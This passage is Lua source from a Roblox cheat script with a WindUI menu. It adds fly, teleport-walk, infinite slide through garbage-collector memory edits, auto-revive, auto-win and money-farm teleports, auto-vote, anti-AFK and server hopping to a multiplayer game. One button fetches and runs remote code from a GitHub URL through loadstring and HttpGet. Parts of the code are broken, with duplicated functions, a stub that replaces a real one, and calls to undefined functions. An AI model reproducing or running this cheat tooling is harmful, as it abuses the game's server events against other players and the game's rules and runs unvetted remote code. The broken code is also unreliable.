local function getDistanceFromPlayer(targetPosition)
    if not character or not rootPart then return 0 end
    return (targetPosition - rootPart.Position).Magnitude
end

local function isPlayerDowned(pl)
    if not pl or not pl.Character then return false end
    local char = pl.Character
    local humanoid = char:FindFirstChild("Humanoid")
    if humanoid and humanoid.Health <= 0 then
        return true
    end
    if char.GetAttribute and char:GetAttribute("Downed") == true then
        return true
    end
    return false
end
local function isPlayerDowned(pl)
    local char = pl.Character
    if char and char:FindFirstChild("Humanoid") then
        local humanoid = char.Humanoid
        return humanoid.Health <= 0 or char:GetAttribute("Downed") == true
    end
    return false
end

local function startAutoRevive()
    if featureStates.FastReviveMethod == "Auto" then
        if reviveLoopHandle then return end
        
        reviveLoopHandle = task.spawn(function()
            while featureStates.FastRevive do
                local LocalPlayer = Players.LocalPlayer
                if LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local myHRP = LocalPlayer.Character.HumanoidRootPart
                    for _, pl in ipairs(Players:GetPlayers()) do
                        if pl ~= LocalPlayer then
                            local char = pl.Character
                            if char and char:FindFirstChild("HumanoidRootPart") then
                                if isPlayerDowned(pl) then
                                    local hrp = char.HumanoidRootPart
                                    local success, dist = pcall(function()
                                        return (myHRP.Position - hrp.Position).Magnitude
                                    end)
                                    if success and dist and dist <= reviveRange then
                                        pcall(function()
                                            interactEvent:FireServer("Revive", true, pl.Name)
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end
                task.wait(loopDelay)
            end
            reviveLoopHandle = nil
        end)
    elseif featureStates.FastReviveMethod == "Interact" then
        if not featureStates.interactHookActive then
            local localPlayer = Players.LocalPlayer
            local eventsFolder = localPlayer.PlayerScripts:WaitForChild("Events")
            local tempEventsFolder = eventsFolder:WaitForChild("temporary_events")
            local useKeybind = tempEventsFolder:WaitForChild("UseKeybind")
            
            local connection = useKeybind.Event:Connect(function(...)
                local args = {...}
                
                if args[1] and type(args[1]) == "table" then
                    local keyData = args[1]
                    
                    if keyData.Key == "Interact" and keyData.Down == true and featureStates.FastRevive then
                        local function reviveAllPlayers()
                            local ohString1 = "Revive"
                            local ohBoolean2 = true
                            
                            for _, player in pairs(Players:GetPlayers()) do
                                if player ~= localPlayer then
                                        local ohString3 = player.Name
                                        pcall(function()
                                            interactEvent:FireServer(ohString1, ohBoolean2, ohString3)
                                        end)
                                        task.wait(0.1)
                                end
                            end
                        end
                        
                        task.spawn(reviveAllPlayers)
                    end
                end
            end)
            
            featureStates.interactConnection = connection
            featureStates.interactHookActive = true
        end
    end
end

local function stopAutoRevive()
    if reviveLoopHandle then
        task.cancel(reviveLoopHandle)
        reviveLoopHandle = nil
    end
    
    if featureStates.interactHookActive then
        if featureStates.interactConnection then
            featureStates.interactConnection:Disconnect()
            featureStates.interactConnection = nil
        end
        featureStates.interactHookActive = false
    end
end

local function startFlying()
    if not character or not humanoid or not rootPart then return end
    flying = true
    bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.Parent = rootPart
    bodyGyro = Instance.new("BodyGyro")
    bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bodyGyro.CFrame = rootPart.CFrame
    bodyGyro.Parent = rootPart
    humanoid.PlatformStand = true
end

local function stopFlying()
    flying = false
    if bodyVelocity then
        bodyVelocity:Destroy()
        bodyVelocity = nil
    end
    if bodyGyro then
        bodyGyro:Destroy()
        bodyGyro = nil
    end
    if humanoid then
        humanoid.PlatformStand = false
    end
end

local function updateFly()
    if not flying or not bodyVelocity or not bodyGyro then return end
    local camera = workspace.CurrentCamera
    local cameraCFrame = camera.CFrame
    local direction = Vector3.new(0, 0, 0)
    local moveDirection = humanoid.MoveDirection
    if moveDirection.Magnitude > 0 then
        local forwardVector = cameraCFrame.LookVector
        local rightVector = cameraCFrame.RightVector
        local forwardComponent = moveDirection:Dot(forwardVector) * forwardVector
        local rightComponent = moveDirection:Dot(rightVector) * rightVector
        direction = direction + (forwardComponent + rightComponent).Unit * moveDirection.Magnitude
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.Space) or humanoid.Jump then
        direction = direction + Vector3.new(0, 1, 0)
    end
    if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then
        direction = direction - Vector3.new(0, 1, 0)
    end
    bodyVelocity.Velocity = direction.Magnitude > 0 and direction.Unit * (featureStates.FlySpeed * 2) or Vector3.new(0, 0, 0)
    bodyGyro.CFrame = cameraCFrame
end

local function Tpwalking()
    if ToggleTpwalk and character and humanoid and rootPart then
        local moveDirection = humanoid.MoveDirection
        local moveDistance = featureStates.TpwalkValue
        local origin = rootPart.Position
        local direction = moveDirection * moveDistance
        local targetPosition = origin + direction
        local raycastParams = RaycastParams.new()
        raycastParams.FilterDescendantsInstances = {character}
        raycastParams.FilterType = Enum.RaycastFilterType.Exclude
        local raycastResult = workspace:Raycast(origin, direction, raycastParams)
        if raycastResult then
            local hitPosition = raycastResult.Position
            local distanceToHit = (hitPosition - origin).Magnitude
            if distanceToHit < math.abs(moveDistance) then
                targetPosition = origin + (direction.Unit * (distanceToHit - 0.1))
            end
        end
        rootPart.CFrame = CFrame.new(targetPosition) * rootPart.CFrame.Rotation
        rootPart.CanCollide = true
    end
end

local function startTpwalk()
    ToggleTpwalk = true
    if TpwalkConnection then
        TpwalkConnection:Disconnect()
    end
    TpwalkConnection = RunService.Heartbeat:Connect(Tpwalking)
end

local function stopTpwalk()
    ToggleTpwalk = false
    if TpwalkConnection then
        TpwalkConnection:Disconnect()
        TpwalkConnection = nil
    end
    if rootPart then
        rootPart.CanCollide = false
    end
end

local function setupJumpBoost()
    if not character or not humanoid then return end
    humanoid.StateChanged:Connect(function(oldState, newState)
        if newState == Enum.HumanoidStateType.Landed then
            jumpCount = 0
        end
    end)
    humanoid.Jumping:Connect(function(isJumping)
        if isJumping and featureStates.JumpBoost and jumpCount < MAX_JUMPS then
            jumpCount = jumpCount + 1
            humanoid.JumpHeight = featureStates.JumpPower
            if jumpCount > 1 then
                rootPart:ApplyImpulse(Vector3.new(0, featureStates.JumpPower * rootPart.Mass, 0))
            end
        end
    end)
end
if featureStates.CustomGravity then
    workspace.Gravity = featureStates.GravityValue
else
    workspace.Gravity = originalGameGravity
end
if not featureStates.GravityValue or type(featureStates.GravityValue) ~= "number" then
    featureStates.GravityValue = originalGameGravity
end
local function reapplyFeatures()
    if featureStates.Fly then
        if flying then stopFlying() end
        startFlying()
    end
end
if featureStates.AutoWhistle then
    stopAutoWhistle()
    startAutoWhistle()
end
local function startJumpBoost()
    if humanoid then
        humanoid.JumpPower = featureStates.JumpPower
    end
end

local function stopJumpBoost()
    jumpCount = 0
    if humanoid then
        humanoid.JumpPower = 50
    end
end

local function startAntiAFK()
    AntiAFKConnection = player.Idled:Connect(function()
        VirtualUser:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        task.wait(1)
        VirtualUser:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
    end)
end

local function stopAntiAFK()
    if AntiAFKConnection then
        AntiAFKConnection:Disconnect()
        AntiAFKConnection = nil
    end
end

local function startAutoCarry()
    AutoCarryConnection = RunService.Heartbeat:Connect(function()
        if not featureStates.AutoCarry then return end
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            for _, other in ipairs(Players:GetPlayers()) do
                if other ~= player and other.Character and other.Character:FindFirstChild("HumanoidRootPart") then
                    local dist = (hrp.Position - other.Character.HumanoidRootPart.Position).Magnitude
                    if dist <= 20 then
                        local args = { "Carry", [3] = other.Name }
                        pcall(function()
                            game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Character"):WaitForChild("Interact"):FireServer(unpack(args))
                        end)
                        task.wait(0.01)
                    end
                end
            end
        end
    end)
end

local function stopAutoCarry()
    if AutoCarryConnection then
        AutoCarryConnection:Disconnect()
        AutoCarryConnection = nil
    end
end

local function getServerLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    return string.format("https://www.roblox.com/games/start?placeId=%d&jobId=%s", placeId, jobId)
end

local function stopNoFog()
    Lighting.FogEnd = originalFogEnd
    for _, atmosphere in pairs(originalAtmospheres) do
        if not atmosphere.Parent then
            local newAtmosphere = Instance.new("Atmosphere")
            for _, prop in pairs({"Density", "Offset", "Color", "Decay", "Glare", "Haze"}) do
                if atmosphere[prop] then
                    newAtmosphere[prop] = atmosphere[prop]
                end
            end
            newAtmosphere.Parent = Lighting
        end
    end
end
local function fireVoteServer(mapNumber)
    local eventsFolder = ReplicatedStorage:WaitForChild("Events", 10)
    if eventsFolder then
        local playerFolder = eventsFolder:WaitForChild("Player", 10)
        if playerFolder then
            local voteEvent = playerFolder:WaitForChild("Vote", 10)
            if voteEvent and typeof(voteEvent) == "Instance" and voteEvent:IsA("RemoteEvent") then
                local args = {[1] = mapNumber}
                voteEvent:FireServer(unpack(args))
            end
        end
    end
end

local function startAutoVote()
    AutoVoteConnection = RunService.Heartbeat:Connect(function()
        fireVoteServer(featureStates.SelectedMap)
    end)
end

local function stopAutoVote()
    if AutoVoteConnection then
        AutoVoteConnection:Disconnect()
        AutoVoteConnection = nil
    end
end

if not workspace:FindFirstChild("SecurityPart") then
    local SecurityPart = Instance.new("Part")
    SecurityPart.Name = "SecurityPart"
    SecurityPart.Size = Vector3.new(10, 1, 10)
    SecurityPart.Position = Vector3.new(5000, 5000, 5000)
    SecurityPart.Anchored = true
    SecurityPart.CanCollide = true
    SecurityPart.Parent = workspace
end
local function startAutoWin()
    local securityPart = workspace:FindFirstChild("SecurityPart")
    if not securityPart then
        print("SecurityPart not found")
        return
    end
    
    AutoWinConnection = RunService.Heartbeat:Connect(function()
        if character and rootPart then
            if not character:GetAttribute("Downed") then
                rootPart.CFrame = securityPart.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end)
end

local function stopAutoWin()
    if AutoWinConnection then
        AutoWinConnection:Disconnect()
        AutoWinConnection = nil
    end
end
local function startAutoMoneyFarm()
    local securityPart = workspace:FindFirstChild("SecurityPart")
    if not securityPart then
        print("SecurityPart not found")
        return
    end
    
    AutoMoneyFarmConnection = RunService.Heartbeat:Connect(function()
        if character and rootPart then
            local downedPlayerFound = false
            local playersInGame = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players")
            if playersInGame then
                for _, v in pairs(playersInGame:GetChildren()) do
                    if v:IsA("Model") and v:GetAttribute("Downed") then
                        if v:FindFirstChild("RagdollConstraints") then
                            continue
                        end
                        
                        rootPart.CFrame = v.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                        ReplicatedStorage.Events.Character.Interact:FireServer("Revive", true, v)
                        task.wait(0.5)
                        downedPlayerFound = true
                        break
                    end
                end
            end
            
            if not downedPlayerFound then
                rootPart.CFrame = securityPart.CFrame + Vector3.new(0, 3, 0)
            end
        end
    end)
end

local function stopAutoMoneyFarm()
    if AutoMoneyFarmConnection then
        AutoMoneyFarmConnection:Disconnect()
        AutoMoneyFarmConnection = nil
    end
end
local autoWhistleHandle = nil

local function startAutoWhistle()
    if autoWhistleHandle then return end  
    autoWhistleHandle = task.spawn(function()
        while featureStates.AutoWhistle do
            pcall(function() 
                game:GetService("ReplicatedStorage").Events.Character.Whistle:FireServer()
            end)
            task.wait(1)
        end
    end)
end

local function stopAutoWhistle()
    featureStates.AutoWhistle = false
    if autoWhistleHandle then
        task.cancel(autoWhistleHandle)
        autoWhistleHandle = nil
    end
end
local function onCharacterAdded(newCharacter, plr)
    if plr == player then
        character = newCharacter
        humanoid = character:WaitForChild("Humanoid", 5)
        rootPart = character:WaitForChild("HumanoidRootPart", 5)
        if not humanoid or not rootPart then
            warn("Failed to find Humanoid or HumanoidRootPart")
            return
        end
        if type(setupJumpBoost) == "function" then
            setupJumpBoost()
        else
            warn("setupJumpBoost is not a function")
        end
        if type(reapplyFeatures) == "function" then
            reapplyFeatures()
        else
            warn("reapplyFeatures is not a function")
        end
    end
end
local function reapplyFeatures()
print("Test")
end
local function onPlayerAdded(plr)
    plr.CharacterAdded:Connect(function(newCharacter)
        onCharacterAdded(newCharacter, plr)
    end)
    if plr.Character then
        onCharacterAdded(plr.Character, plr)
    end
end

Players.PlayerAdded:Connect(onPlayerAdded)

for _, plr in ipairs(Players:GetPlayers()) do
    onPlayerAdded(plr)
end

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if not gameProcessedEvent and input.KeyCode == Enum.KeyCode.Space then
        if featureStates.InfiniteJump then
            if featureStates.JumpMethod == "Hold" then
                isJumpHeld = true
                bouncePlayer()
                task.spawn(function()
                    while isJumpHeld and featureStates.InfiniteJump and featureStates.JumpMethod == "Hold" do
                        bouncePlayer()
                        task.wait(0.1)
                    end
                end)
            elseif featureStates.JumpMethod == "Spam" then
                if not isJumpHeld then
                    isJumpHeld = true
                    bouncePlayer()
                end
            end
        end
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessedEvent)
    if not gameProcessedEvent and input.KeyCode == Enum.KeyCode.Space then
        isJumpHeld = false
    end
end)

local function setupMobileJumpButton()
    local success, result = pcall(function()
        local touchGui = player.PlayerGui:WaitForChild("TouchGui", 5)
        local touchControlFrame = touchGui:WaitForChild("TouchControlFrame", 5)
        local jumpButton = touchControlFrame:WaitForChild("JumpButton", 5)
        
        jumpButton.Activated:Connect(function()
            if featureStates.InfiniteJump then
                if featureStates.JumpMethod == "Spam" then
                    bouncePlayer()
                elseif featureStates.JumpMethod == "Hold" then
                    bouncePlayer()
                end
            end
        end)

        jumpButton.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                isJumpHeld = true
                if featureStates.InfiniteJump and featureStates.JumpMethod == "Hold" then
                    while isJumpHeld and featureStates.InfiniteJump and featureStates.JumpMethod == "Hold" do
                        bouncePlayer()
                        task.wait(0.1)
                    end
                end
            end
        end)

        jumpButton.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                isJumpHeld = false
            end
        end)
    end)
    if not success then
        warn("Failed to set up mobile jump button: " .. tostring(result))
    end
end

if player.Character then
    onCharacterAdded(player.Character, player)
else
    player.CharacterAdded:Connect(function(newCharacter)
        onCharacterAdded(newCharacter, player)
    end)
end
infiniteSlideEnabled = false
slideFrictionValue = -8
movementTables = {}
infiniteSlideHeartbeat = nil
infiniteSlideCharacterConn = nil
currentState = nil
cachedPlayerModel = nil
cachedGameFolder = nil
isCurrentlySliding = false
originalFriction = nil
slideFrictionApplied = false

requiredKeys = {
    "Friction","AirStrafeAcceleration","JumpHeight","RunDeaccel",
    "JumpSpeedMultiplier","JumpCap","SprintCap","WalkSpeedMultiplier",
    "BhopEnabled","Speed","AirAcceleration","RunAccel","SprintAcceleration"
}

function cacheGameObjects()
    if not cachedGameFolder then
        cachedGameFolder = workspace:FindFirstChild("Game")
    end
    return cachedGameFolder
end

function updatePlayerModel()
    if not cacheGameObjects() then 
        cachedPlayerModel = nil
        return false 
    end
    
    local playersFolder = cachedGameFolder:FindFirstChild("Players")
    if not playersFolder then 
        cachedPlayerModel = nil
        return false 
    end
    
    local newModel = playersFolder:FindFirstChild(player.Name)
    if newModel ~= cachedPlayerModel then
        cachedPlayerModel = newModel
    end
    
    return cachedPlayerModel ~= nil
end

function hasRequiredFields(tbl)
    if typeof(tbl) ~= "table" then return false end
    for _, key in ipairs(requiredKeys) do
        if rawget(tbl, key) == nil then return false end
    end
    return true
end

function findMovementTables()
    movementTables = {}
    local gc = getgc(true)
    
    for _, obj in ipairs(gc) do
        if hasRequiredFields(obj) then
            table.insert(movementTables, obj)
            if originalFriction == nil and obj.Friction ~= nil then
                originalFriction = obj.Friction
            end
        end
    end
    
    return #movementTables > 0
end

function storeOriginalFriction()
    if originalFriction ~= nil then return end
    
    for _, tbl in ipairs(movementTables) do
        if tbl and typeof(tbl) == "table" and tbl.Friction ~= nil then
            originalFriction = tbl.Friction
            return
        end
    end
end

function applySlideFriction(value)
    if #movementTables == 0 then return end
    
    for _, tbl in ipairs(movementTables) do
        if tbl and typeof(tbl) == "table" and tbl.Friction ~= nil then
            tbl.Friction = value
        end
    end
    slideFrictionApplied = true
end

function restoreOriginalFriction()
    if #movementTables == 0 or originalFriction == nil then return end
    
    for _, tbl in ipairs(movementTables) do
        if tbl and typeof(tbl) == "table" and tbl.Friction ~= nil then
            tbl.Friction = originalFriction
        end
    end
    slideFrictionApplied = false
end

function isPlayerSliding()
    if not cachedPlayerModel then return false end
    
    local state = cachedPlayerModel:GetAttribute("State")
    return state == "Slide" or state == "EmotingSlide"
end

function infiniteSlideHeartbeatFunc()
    if not infiniteSlideEnabled then return end
    
    if not cachedPlayerModel or os.clock() % 1.0 < 0.016 then
        if not updatePlayerModel() then return end
    end
    
    local wasSliding = isCurrentlySliding
    isCurrentlySliding = isPlayerSliding()
    
    if isCurrentlySliding ~= wasSliding then
        if isCurrentlySliding then
            storeOriginalFriction()
            applySlideFriction(slideFrictionValue)
            pcall(function()
                if cachedPlayerModel:GetAttribute("State") == "Slide" then
                    cachedPlayerModel:SetAttribute("State", "EmotingSlide")
                end
            end)
        else
            if originalFriction then
                restoreOriginalFriction()
            else
                applySlideFriction(5)
            end
        end
    elseif isCurrentlySliding then
        if not slideFrictionApplied then
            applySlideFriction(slideFrictionValue)
        end
        
        pcall(function()
            if cachedPlayerModel:GetAttribute("State") ~= "EmotingSlide" then
                cachedPlayerModel:SetAttribute("State", "EmotingSlide")
            end
        end)
    end
end

function onCharacterAddedSlide(character)
    if not infiniteSlideEnabled then return end
    
    cachedPlayerModel = nil
    cachedGameFolder = nil
    isCurrentlySliding = false
    slideFrictionApplied = false
    
    for i = 1, 10 do
        task.wait(i * 0.1)
        if updatePlayerModel() then
            break
        end
    end
    
    task.wait(0.5)
    findMovementTables()
    
    if originalFriction then
        restoreOriginalFriction()
    end
end

function cleanupInfiniteSlide()
    if infiniteSlideHeartbeat then
        infiniteSlideHeartbeat:Disconnect()
        infiniteSlideHeartbeat = nil
    end
    
    if infiniteSlideCharacterConn then
        infiniteSlideCharacterConn:Disconnect()
        infiniteSlideCharacterConn = nil
    end
    
    if originalFriction then
        restoreOriginalFriction()
    else
        applySlideFriction(5)
    end
    
    movementTables = {}
    cachedPlayerModel = nil
    cachedGameFolder = nil
    currentState = nil
    isCurrentlySliding = false
    slideFrictionApplied = false
    originalFriction = nil
end

function setInfiniteSlide(enabled)
    if infiniteSlideEnabled == enabled then return end
    
    infiniteSlideEnabled = enabled

    if enabled then
        cacheGameObjects()
        
        if not infiniteSlideCharacterConn then
            infiniteSlideCharacterConn = player.CharacterAdded:Connect(onCharacterAddedSlide)
        end
        
        findMovementTables()
        
        if player.Character then
            task.spawn(function()
                onCharacterAddedSlide(player.Character)
            end)
        end
        
        if infiniteSlideHeartbeat then 
            infiniteSlideHeartbeat:Disconnect() 
        end
        infiniteSlideHeartbeat = RunService.Heartbeat:Connect(infiniteSlideHeartbeatFunc)
    else
        cleanupInfiniteSlide()
    end
end

game:GetService("Players").PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        cleanupInfiniteSlide()
    end
end)
RunService.RenderStepped:Connect(updateFly)
local function setupGui()
local function getServers()
    local request = request({
        Url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Desc&limit=100",
        Method = "GET",
    })

    if request.StatusCode == 200 then
        local serverData = HttpService:JSONDecode(request.Body)
        local serverList = {}

        for _, server in pairs(serverData.data) do
            if server.id ~= jobId and server.playing < server.maxPlayers then
                local serverInfo = {
                    serverId = server.id or "N/A",
                    players = server.playing or 0,
                    maxPlayers = server.maxPlayers or 0,
                    ping = server.ping or "N/A",
                }
                table.insert(serverList, serverInfo)
            end
        end
        return serverList
    else
        return {}
    end
end

local function serverHop()

local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local Deleted = false
local S_T = game:GetService("TeleportService")
local S_H = game:GetService("HttpService")

local File = pcall(function()
	AllIDs = S_H:JSONDecode(readfile("server-hop-temp.json"))
end)
if not File then
	table.insert(AllIDs, actualHour)
	pcall(function()
		writefile("server-hop-temp.json", S_H:JSONEncode(AllIDs))
	end)

end
local function TPReturner(placeId)
	local Site;
	if foundAnything == "" then
		Site = S_H:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. placeId .. '/servers/Public?sortOrder=Asc&limit=100'))
	else
		Site = S_H:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. placeId .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
	end
	local ID = ""
	if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
		foundAnything = Site.nextPageCursor
	end
	local num = 0;
	for i,v in pairs(Site.data) do
		local Possible = true
		ID = tostring(v.id)
		if tonumber(v.maxPlayers) > tonumber(v.playing) then
			for _,Existing in pairs(AllIDs) do
				if num ~= 0 then
					if ID == tostring(Existing) then
						Possible = false
					end
				else
					if tonumber(actualHour) ~= tonumber(Existing) then
						local delFile = pcall(function()
							delfile("server-hop-temp.json")
							AllIDs = {}
							table.insert(AllIDs, actualHour)
						end)
					end
				end
				num = num + 1
			end
			if Possible == true then
				table.insert(AllIDs, ID)
				wait()
				pcall(function()
					writefile("server-hop-temp.json", S_H:JSONEncode(AllIDs))
					wait()
					S_T:TeleportToPlaceInstance(placeId, ID, game.Players.LocalPlayer)
				end)
				wait(4)
			end
		end
	end
end
local module = {}
function module:Teleport(placeId)
	while wait() do
		pcall(function()
			TPReturner(placeId)
			if foundAnything ~= "" then
				TPReturner(placeId)
			end
		end)
	end
end
module:Teleport(game.PlaceId)
return module
end


local function rejoinServer()
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer

TeleportService:Teleport(game.PlaceId, player)
end

    local FeatureSection = Window:Section({ Title = "Features", Opened = true })

    local Tabs = {
    Main = FeatureSection:Tab({ Title = "Main", Icon = "layout-grid" }),
    Player = FeatureSection:Tab({ Title = "Player", Icon = "user" }),
    Auto = FeatureSection:Tab({ Title = "Auto", Icon = "repeat-2" }),
    Visuals = FeatureSection:Tab({ Title = "Visuals", Icon = "camera" }),
    ESP = FeatureSection:Tab({ Title = "ESP", Icon = "eye" }),
    Utility = FeatureSection:Tab({ Title = "Utility", Icon = "wrench"}),
    Teleport = FeatureSection:Tab({ Title = "Teleport", Icon = "navigation" }),
    Settings = FeatureSection:Tab({ Title = "Settings", Icon = "settings" }),
    info = FeatureSection:Tab({ Title = "info", Icon = "info" })
    
}


-- Main Tab
Tabs.Main:Section({ Title = "Server Info", TextSize = 20 })
Tabs.Main:Divider()

local placeName = "Unknown"
local success, productInfo = pcall(function()
    return MarketplaceService:GetProductInfo(placeId)
end)
if success and productInfo then
    placeName = productInfo.Name
end

Tabs.Main:Paragraph({
    Title = "Game Mode",
    Desc = placeName
})

Tabs.Main:Button({
    Title = "Copy Server Link",
    Desc = "Copy the current server's join link",
    Icon = "link",
    Callback = function()
        local serverLink = getServerLink()
        pcall(function()
            setclipboard(serverLink)
        end)
        WindUI:Notify({
                Icon = "link",
                Title = "Link Copied",
                Content = "The server invite link has been copied to your clipborad",
                Duration = 3
        })
    end
})

local numPlayers = #Players:GetPlayers()
local maxPlayers = Players.MaxPlayers

Tabs.Main:Paragraph({
    Title = "Current Players",
    Desc = numPlayers .. " / " .. maxPlayers
})

Tabs.Main:Paragraph({
    Title = "Server ID",
    Desc = jobId
})

Tabs.Main:Paragraph({
    Title = "Place ID",
    Desc = tostring(placeId)
})

Tabs.Main:Section({ Title = "Server Tools", TextSize = 20 })
Tabs.Main:Divider()

Tabs.Main:Button({
    Title = "Rejoin",
    Desc = "Rejoin the current server",
    Icon = "refresh-cw",
    Callback = function()
        rejoinServer()
    end
})

Tabs.Main:Button({
    Title = "Server Hop",
    Desc = "Hop to a random server",
    Icon = "shuffle",
    Callback = function()
        serverHop()
    end
})

Tabs.Main:Button({
    Title = "Hop to Small Server",
    Desc = "Hop to the smallest available server",
    Icon = "minimize",
    Callback = function()
        hopToSmallServer()
    end
})

Tabs.Main:Button({
       Title = "Advanced Server Hop",
       Desc = "Finding a Server inside your game",
       Icon = "server",
       Callback = function()
           local success, result = pcall(function()
               local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pnsdgsa/Script-kids/refs/heads/main/Advanced%20Server%20Hop.lua"))()
           end)
           if not success then
               WindUI:Notify({
                   Title = "Error",
                   Content = "Oopsie Daisy Some thing wrong happening with the Github Repository link, Unfortunately this script no longer exsit: " .. tostring(result),
                   Duration = 4
               })
           else
               WindUI:Notify({
                   Title = "Success",
                   Content = "Script Is Loaded",
                   Duration = 3
               })
           end
       end
   })
   AutoServerHopEnabled = false
AutoServerHopInterval = 30
AutoServerHopTimer = nil
AutoServerHopType = "Random"
lastHopTime = 0

function stopAutoServerHop()
    if AutoServerHopTimer then
        AutoServerHopTimer:Disconnect()
        AutoServerHopTimer = nil
    end
    AutoServerHopEnabled = false
end

function startAutoServerHop()
    if AutoServerHopTimer then
        AutoServerHopTimer:Disconnect()
    end
    AutoServerHopEnabled = true
    lastHopTime = tick()
    AutoServerHopTimer = game:GetService("RunService").Heartbeat:Connect(function()
        if tick() - lastHopTime >= AutoServerHopInterval then
            lastHopTime = tick()
            if AutoServerHopType == "Small" then
                pcall(function()
                    if type(hopToSmallServer) == "function" then
                        hopToSmallServer()
                    else
                        serverHop()
                    end
                end)
            else
                pcall(serverHop)
            end
            WindUI:Notify({
                Title = "Auto Server Hop",
                Content = "Hopping to " .. (AutoServerHopType == "Small" and "small" or "random") .. " server...",
                Duration = 3
            })
        end
    end)
end

AutoServerHopToggle = Tabs.Main:Toggle({
    Title = "Auto Server Hop",
    Flag = "AutoServerHopToggle",
    Desc = "Note: If you use this for auto farm be sure enable auto load/save config",
    Value = false,
    Callback = function(state)
        if state then
            if AutoServerHopInterval < 20 then
                WindUI:Notify({
                    Title = "Auto Server Hop",
                    Content = "Interval must be at least 20 seconds!",
                    Duration = 3
                })
                if AutoServerHopToggle and AutoServerHopToggle.Set then
                    AutoServerHopToggle:Set(false)
                end
                return
            end
            startAutoServerHop()
        else
            stopAutoServerHop()
        end
    end
})

AutoServerHopTypeDropdown = Tabs.Main:Dropdown({
    Title = "Server Hop Type",
    Flag = "AutoServerHopTypeDropdown",
    Desc = "Choose between small or random server hopping",
    Values = {"Random", "Small"},
    Value = "Random",
    Callback = function(value)
        AutoServerHopType = value
        if AutoServerHopEnabled then
            stopAutoServerHop()
            startAutoServerHop()
        end
    end
})

AutoServerHopIntervalInput = Tabs.Main:Input({
    Title = "Hop Interval (seconds)",
    Flag = "AutoServerHopIntervalInput",
    Desc = "Minimum 20 seconds",
    Placeholder = "30",
    NumbersOnly = true,
    Value = "30",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 20 then
            AutoServerHopInterval = num
            if AutoServerHopEnabled then
                stopAutoServerHop()
                startAutoServerHop()
            end
        else
            WindUI:Notify({
                Title = "Auto Server Hop",
                Content = "Interval must be at least 20 seconds!",
                Duration = 3
            })
            AutoServerHopIntervalInput:Set("30")
            AutoServerHopInterval = 30
        end
    end
})
Tabs.Main:Section({ Title = "Misc", TextSize = 20 })
Tabs.Main:Divider()

ResetWhenTakeDamageToggle = Tabs.Main:Toggle({
    Title = "Reset when take damage",
    Flag = "ResetWhenTakeDamageToggle",
    Value = featureStates.ResetWhenTakeDamage,
    Callback = function(value)
        featureStates.ResetWhenTakeDamage = value
    end
})

ResetDamageTypeDropdown = Tabs.Main:Dropdown({
    Title = "Reset damage types",
    Flag = "ResetDamageTypeDropdown",
    Values = {"Any Damage", "Low Health"},
    Value = featureStates.ResetDamageType,
    Callback = function(value)
        featureStates.ResetDamageType = value
    end
})
   Tabs.Main:Button({
    Title = "Show/Hide Reload button",
    Desc = "This button allow you to use front view mode without keyboard or any tool in vip server",
    Icon = "switch-camera",
    Callback = function()
        if reloadVisible then
            if reloadButton then
                reloadButton.Visible = false
                reloadButton.Active = false
            end
            reloadVisible = false
        else
            reloadButton = game:GetService("Players").LocalPlayer.PlayerGui.Shared.HUD.Mobile.Right.Mobile.ReloadButton
            local originalParent = reloadButton.Parent
            reloadButton.Parent = nil
            wait()
            reloadButton.Parent = originalParent
            reloadButton.Visible = true
            reloadButton.Active = true
            reloadVisible = true
        end
    end
})
       AntiAFKToggle = Tabs.Main:Toggle({
        Title = "Anti AFK",
        Flag = "AntiAFKToggle",
        Value = false,
        Callback = function(state)
            featureStates.AntiAFK = state
            if state then
                startAntiAFK()
            else
                stopAntiAFK()
            end
        end
    })
    local PathfindingService = game:GetService("PathfindingService")

featureStates.AntiNextbot = false
featureStates.AntiNextbotTeleportType = "Distance"
featureStates.AntiNextbotDistance = 50
featureStates.DistanceTeleport = 20

local function handleAntiNextbot()
    if not featureStates.AntiNextbot then return end

    local character = Players.LocalPlayer.Character
    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return end

    local nextbots = {}
    local npcsFolder = workspace:FindFirstChild("NPCs")
    if npcsFolder then
        for _, model in ipairs(npcsFolder:GetChildren()) do
            if model:IsA("Model") and isNextbotModel(model) then
                local hrp = model:FindFirstChild("HumanoidRootPart")
                if hrp then
                    table.insert(nextbots, model)
                end
            end
        end
    end

    local playersFolder = workspace:FindFirstChild("Game") and workspace.Game:FindFirstChild("Players")
    if playersFolder then
        for _, model in ipairs(playersFolder:GetChildren()) do
            if model:IsA("Model") and isNextbotModel(model) then
                local hrp = model:FindFirstChild("HumanoidRootPart")
                if hrp then
                    table.insert(nextbots, model)
                end
            end
        end
    end

